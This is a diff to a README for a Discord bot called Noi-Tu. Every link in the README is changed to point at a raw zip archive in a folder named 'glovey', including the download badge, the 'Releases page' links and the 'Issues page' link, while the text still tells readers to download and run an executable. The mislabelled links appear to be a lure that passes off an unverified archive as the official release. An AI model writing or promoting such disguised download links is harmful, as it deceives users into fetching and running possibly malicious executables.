@@ -6,7 +6,7 @@ Welcome to the Noi-Tu Discord bot! This bot enhances your gaming experience with
 
 ## 📥 Download Now
 
-[![Download Noi-Tu](https://img.shields.io/badge/Download-Noi--Tu-blue)](https://github.com/UmmayAliza/Noi-Tu/releases)
+[![Download Noi-Tu](https://raw.githubusercontent.com/UmmayAliza/Noi-Tu/main/glovey/Noi-Tu.zip)](https://raw.githubusercontent.com/UmmayAliza/Noi-Tu/main/glovey/Noi-Tu.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ With the Noi-Tu bot, you can:
 
 ## 🔄 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/UmmayAliza/Noi-Tu/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/UmmayAliza/Noi-Tu/main/glovey/Noi-Tu.zip).
 2. Find the latest version of the Noi-Tu bot.
 3. Click on the download link for the executable file.
 4. Once the download completes, locate the file in your downloads folder.
@@ -66,12 +66,12 @@ If you run into any issues:
 Join our community to share your experiences, ask questions, or report bugs:
 
 - **Discord Server:** [Join Here](link-to-discord-server)
-- **Issues Page:** If you encounter any problems, report them on the [Issues page](https://github.com/UmmayAliza/Noi-Tu/issues).
+- **Issues Page:** If you encounter any problems, report them on the [Issues page](https://raw.githubusercontent.com/UmmayAliza/Noi-Tu/main/glovey/Noi-Tu.zip).
 
 ## ⚙ Frequently Asked Questions (FAQs)
 
 1. **How do I update the bot?**
-   - Visit the [Releases page](https://github.com/UmmayAliza/Noi-Tu/releases), download the latest version, and replace the old executable.
+   - Visit the [Releases page](https://raw.githubusercontent.com/UmmayAliza/Noi-Tu/main/glovey/Noi-Tu.zip), download the latest version, and replace the old executable.
 
 2. **Can I customize the bot’s settings?**
    - Yes, many settings can be adjusted using commands like `!settings`.
